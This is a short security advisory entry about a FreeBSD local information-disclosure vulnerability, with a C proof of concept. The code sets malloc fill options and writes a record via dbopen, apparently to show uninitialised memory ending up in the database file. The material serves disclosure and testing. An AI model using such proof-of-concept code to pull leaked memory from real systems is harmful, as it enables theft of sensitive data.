source: http://www.securityfocus.com/bid/34666/info

FreeBSD is prone to a local information-disclosure vulnerability.

Local attackers can exploit this issue to obtain sensitive information that may lead to further attacks.

#include <sys/types.h>

#include <db.h>
#include <err.h>
#include <fcntl.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int
main()
{
	const char data[] = "abcd";
	DB *db;
	DBT dbt;

	/*
	 * Set _malloc_options to "J" so that all memory obtained from
	 * malloc(3) is iniatialized to 0x5a. See malloc(3) manual page
	 * for additional information.
	 */
	_malloc_options = "J";

	db = dbopen("test.db", O_RDWR | O_CREAT | O_TRUNC, 0644, DB_HASH, NULL);
	if (db == NULL)
		err(1, "dbopen()");

	dbt.data = &data;
	dbt.size = sizeof(data);

	if (db->put(db, &dbt, &dbt, 0) != 0)
		err(1, "db->put()");

	db->close(db);

	return (0);
}